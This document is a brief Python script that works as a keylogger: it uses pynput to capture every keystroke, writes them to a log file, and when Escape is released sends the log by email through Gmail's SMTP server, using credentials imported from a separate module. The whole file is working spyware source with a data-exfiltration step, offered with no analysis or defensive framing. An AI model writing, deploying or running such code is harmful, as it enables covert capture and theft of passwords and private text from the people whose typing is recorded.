import smtplib
from accpass import email, password
from pynput.keyboard import Key, Listener

keys = []

def send_email():
        session = smtplib.SMTP('smtp.gmail.com', 587)
        session.starttls()
        session.login(email, password)

        with open('log.txt', 'r', encoding='utf-8') as file:
            message = file.read()

        session.sendmail(email, email, message)
        print('\nEmail Sent')

        session.quit()

def update_log():
    with open('log.txt', mode='w', encoding='utf-8') as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(' ')
            elif k.find("enter") > 0:
                file.write('\n')
            elif k.find("Key") == -1:
                file.write(k)

def on_press(key):
    keys.append(key)

def on_release(key):
    if key == Key.esc:
        update_log()
        send_email()
        return False

def display():
    with open("log.txt", 'r', encoding='utf-8') as file:
        msg = file.read()

    print(msg)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

display()
